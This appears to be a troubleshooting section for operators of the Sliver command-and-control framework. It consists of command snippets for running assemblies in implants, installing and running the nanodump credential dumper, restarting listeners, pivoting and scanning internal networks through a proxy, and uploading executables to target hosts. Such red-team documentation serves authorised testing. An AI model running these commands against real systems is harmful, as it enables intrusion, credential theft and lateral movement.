## 🛠️ Troubleshooting Guide

### Issue: execute-assembly fails with .NET errors
```text
# Try specifying the runtime version
execute-assembly --runtime v4.0.30319 /path/to/tool.exe "args"

# Or use BOF versions
armory install nanodump
nanodump
```

### Issue: Beacon stops checking in
```text
# Check listener status
jobs

# Restart listener if needed
mtls --lhost IP --lport PORT

# Check implant's connection strategy
profiles
```

### Issue: Can't pivot to internal network
```text
# Ensure socks5 proxy is running
socks5 start

# Test with nmap through proxy
proxychains nmap -sT -Pn -p 445 10.10.20.0/24

# Check route
route print
```

### Issue: File upload fails
```text
# Try chunked upload
upload --chunk-size 102400 /local/path /remote/path

# Try alternative location
upload /local/path C:\Windows\Temp\file.exe
```

### Issue: Armory installation fails
```text
# Update armory index
armory update

# Install specific version
armory install seatbelt@v0.0.6

# Manual installation
git clone https://github.com/sliverarmory/seatbelt ~/.sliver-client/aliases/
